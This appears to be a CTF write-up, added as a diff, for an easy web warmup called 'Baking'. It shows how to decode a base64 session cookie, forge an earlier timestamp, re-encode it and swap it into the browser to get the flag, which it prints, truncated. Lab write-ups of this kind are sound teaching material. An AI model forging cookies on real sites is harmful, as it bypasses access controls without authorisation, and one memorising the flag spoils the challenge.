@@ -1,0 +1,27 @@
+Challenge: Baking
+Category: Warmups
+Difficulty: easy
+Author: @JohnHammond
+Description: Do you know how to make cookies? How about HTTP flavored?
+
+Press the Start button in the top-right to begin this challenge.
+
+1. Launch the VM and connect to the URL at: http://chal.ctf.games:30484/
+2. View the oven options, bake "Magic Cookies"
+3. Timer states cookies will be done in 120 hours (7200 minutes)
+4. Open developer tools
+	a. Application > Cookies
+5. Note the cookie "in_oven"
+6. Decode base64 value
+	a. echo "eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzExLzIwMjMsIDEzOjQ5OjExIn0=" | base64 -d
+	b. {"recipe": "Magic Cookies", "time": "10/11/2023, 13:49:11"}
+7. Craft a new cookie, that is 120 hours+ in the past and encode to base64
+	a. Cookie: {"recipe": "Magic Cookies", "time": "10/01/2023, 12:00:00"} 
+	b. Encode: echo '{"recipe": "Magic Cookies", "time": "10/01/2023, 12:00:00"}' | base64
+	c. Output: eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzAxLzIwMjMsIDEyOjAwOjAwIn0g 
+7. Modify Cookie
+	a. Right click on the value for "in_oven" and edit
+	b. Supply the new value from our extra special cookie: eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzAxLzIwMjMsIDEyOjAwOjAwIn0g
+8. Reload the page and capture the flag
+	a. Your Magic Cookies are done! Be careful they are hot! Congratulations flag{c36fb6ebdbc2c44e6198bf4154d94ed4
+	b. flag{c36fb6ebdbc2c44e6198bf4154d94ed4
